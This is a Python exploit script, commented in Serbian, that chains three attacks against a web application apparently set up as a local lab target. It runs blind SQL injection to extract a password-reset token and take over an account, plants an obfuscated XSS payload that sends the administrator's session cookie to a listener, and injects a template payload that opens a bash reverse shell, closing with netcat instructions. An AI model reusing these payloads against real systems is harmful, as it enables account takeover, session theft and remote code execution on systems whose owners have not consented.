import requests
import sys
import socket
import base64

TARGET      = "http://localhost:8000"
USER        = "user1"
NEW_PASSWORD = "admin1234"
LHOST       = "10.43.47.38"   # tvoj IP za XSS listener
LPORT       = 8888            # port za XSS listener (ne 8000 jer je to TARGET)
LHOST_RCE   = "10.43.47.38" # tvoj IP za reverse shell
LPORT_RCE   = 9999            # port za reverse shell (slušaš sa netcat-om)

# ============================================================
# DEO 1 - LOGIN BYPASS (SQLi u forgotusername.php)
# ============================================================
print("\n=== DEO 1: LOGIN BYPASS ===")

# Korak 1 - pokreni reset lozinke da se token kreira u bazi
r = requests.post(f"{TARGET}/forgotpassword.php", data={"username": USER})
assert "Email sent!" in r.text, "Korisnik ne postoji!"
print(f"[*] Reset token kreiran za: {USER}")

# Oracle funkcija - pita bazu da/ne pitanja kroz SQLi
def oracle(query):
    r = requests.post(
        f"{TARGET}/forgotusername.php",
        data={"username": f"{query};--"}
    )
    return "User exists!" in r.text

# Korak 2 - nadji UID korisnika
uid = 0
while True:
    if oracle(f"{USER}' and uid={uid}"):
        print(f"[*] UID pronadjen: {uid}")
        break
    uid += 1

# Korak 3 - izvuci token karakter po karakter linearnom pretragom
print("[*] Izvlacim token: ", end='')
token = ""
for i in range(32):
    for ascii_val in range(48, 123):  # proba svaki karakter od '0' do 'z' redom
        sql = f"(select ascii(substring(token,{i+1},1)) from tokens where uid={uid} order by tid limit 1)"
        if oracle(f"{USER}' and {sql}='{ascii_val}'"):
            token += chr(ascii_val)
            print(chr(ascii_val), end='')
            sys.stdout.flush()
            break
print()

# Korak 4 - resetuj lozinku
r = requests.post(
    f"{TARGET}/resetpassword.php",
    data={"token": token, "password1": NEW_PASSWORD, "password2": NEW_PASSWORD}
)
assert "Password changed!" in r.text, "Reset lozinke nije uspeo!"
print(f"[+] Lozinka za '{USER}' promenjena u: {NEW_PASSWORD}")

# ============================================================
# DEO 2 - PRIVILEGE ESCALATION (XSS da ukraden admin cookie)
# ============================================================
print("\n=== DEO 2: PRIVILEGE ESCALATION ===")

# Uloguj se kao user1 sa novom lozinkom
s = requests.Session()
r = s.post(
    f"{TARGET}/login.php",
    data={"username": USER, "password": NEW_PASSWORD},
    allow_redirects=False
)
assert r.status_code == 302, "Login nije uspeo!"
print(f"[*] Ulogovan kao: {USER}")

# Ubaci XSS payload u description
# Payload: kada admin poseti stranicu, njegov cookie se salje na nas listener
b64 = base64.b64encode(
    f"fetch('//{LHOST}:{LPORT}/'+btoa(document.cookie))".encode()
).decode()
payload = f"<img src/onerror='eval(atob(`{b64}`))'/>"

r = s.post(f"{TARGET}/profile.php", data={"description": payload})
assert "Success" in r.text, "XSS payload nije postavljen!"
print(f"[*] XSS payload ubacen u description")

# Pokreni listener i cekaj admina da poseti stranicu
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((LHOST, int(LPORT)))
sock.listen()
print(f"[*] Slušam na {LHOST}:{LPORT}...")
print(f"[*] Cekam da admin poseti stranicu...")

(sock_c, ip_c) = sock.accept()
get_request = sock_c.recv(4096)
print("RAW REQUEST:", get_request[:200])  # dodaj ovo
raw = get_request.split(b" ")[1][1:]
print("RAW B64:", raw)  # i ovo
raw += b"=" * (-len(raw) % 4)  # dodaj padding
admin_cookie = base64.b64decode(raw).decode()
print(f"[+] Ukraden admin cookie: {admin_cookie}")

# ============================================================
# DEO 3 - REMOTE CODE EXECUTION (reverse shell kroz admin panel)
# ============================================================
print("\n=== DEO 3: REMOTE CODE EXECUTION ===")

# Nova sesija sa admin cookiejem
s2 = requests.Session()
s2.cookies.update({"PHPSESSID": admin_cookie.split("PHPSESSID=")[-1]})
print("p1")
# Ubaci reverse shell payload kroz admin panel
payload = f'''
    {{php}}
    system("bash -c \\"bash -i >& /dev/tcp/{LHOST_RCE}/{LPORT_RCE} 0>&1\\"");
    {{/php}}
'''
print("p2")

# s2.post(f"{TARGET}/admin/update_motd.php", data={"message": f"{payload}"})
resp = s2.post(f"{TARGET}/admin/update_motd.php", data={"message": f"{payload}"})
print("p3 - status:", resp.status_code)
print("p3 - response:", resp.text[:200])

# Triggeruj izvrsavanje
try:
    s2.get(f"{TARGET}/index.php", timeout=3)
except requests.exceptions.Timeout:
    pass  # Ocekivano - server je zauzet sa shellom
print("p4")
print(f"[+] Reverse shell payload poslat!")
print(f"[+] Proveri netcat listener na portu {LPORT_RCE}")
print(f"    Pokreni: nc -lvnp {LPORT_RCE}")